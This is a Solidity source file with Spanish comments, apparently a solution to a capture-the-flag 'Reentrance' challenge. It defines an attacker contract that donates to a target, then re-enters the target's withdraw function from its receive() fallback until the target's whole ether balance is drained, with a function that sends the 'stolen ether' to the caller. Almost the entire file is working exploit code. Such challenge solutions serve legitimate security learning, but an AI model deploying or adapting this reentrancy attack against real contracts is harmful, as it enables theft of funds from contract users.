pragma solidity 0.7.3;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

abstract contract IReentrance { //Usamos un contrato abstracto ya que no podemos definir variables dentro de una Interfaz.
  mapping(address => uint256) public balances;

  function donate(address _to) external payable virtual;
  function withdraw(uint256 _amount) external virtual;
}

contract OchoMinutos is Ownable{
  IReentrance public challenge;
  uint256 donacionInicial;

  constructor (address challengeAddress){
    challenge = IReentrance(challengeAddress);
  }

  function donarYAtacar() external payable {
    //Dono.
    donacionInicial = msg.value;
    challenge.donate{value: donacionInicial}(address(this));
    //Luego ataco.
    withdrawFromChallenge();
  }

  function withdrawFromChallenge() private {
    uint256 balanceRestante = address(challenge).balance;
    bool continuarSacando = balanceRestante > 0;

    if (continuarSacando){
      uint256 retiro =  balanceRestante > donacionInicial ? donacionInicial : balanceRestante;
    challenge.withdraw(retiro);
    }
  } 

  function retirarEtherRobado() external {
    console.log("ESTAS RETIRANDO %s ETH", address(this).balance);
    (bool sent, ) = payable(msg.sender).call{value: address(this).balance}("");
    require(sent, "ERROR AL RETIRAR ETH ROBADO");
    console.log("TE CHOREASTE TODO ROBIN HOOD");
  }

  receive() external payable{
    withdrawFromChallenge();
    // console.log("DENTRO DEL RECEIVE ATACANTE");
    // 2) Reviso el saldo restante que queda en el contrato víctima.
    // if (address(challenge).balance >= 0.1 ether){
      // console.log("TODAVIA HAY ETHER EN EL CONTRATO VICTIMA");
    // 3) Llamo función withdraw del contrato víctima con el mismo valor que usé en el withdrawFromChallenge.
      // challenge.withdraw(donacionInicial);
    // }else {
      // console.log("EL BALANCE DEL CONTRATO ES MENOR A 0.1 ETH, SE RETIRA EL RESTO");
      // challenge.withdraw(address(challenge).balance);
  }
}

//Posibles problemas: Recordar que las cantidades enviadas siempre se miden en wei. Si hacemos withdraw(1), estamos queriendo retirar 1 wei, por lo que necesitaremos DEMASIADAS transacciones, lo que nos llevará a quedarnos sin gas (Menor cantidad de tx, menos gas se GAStará jeje).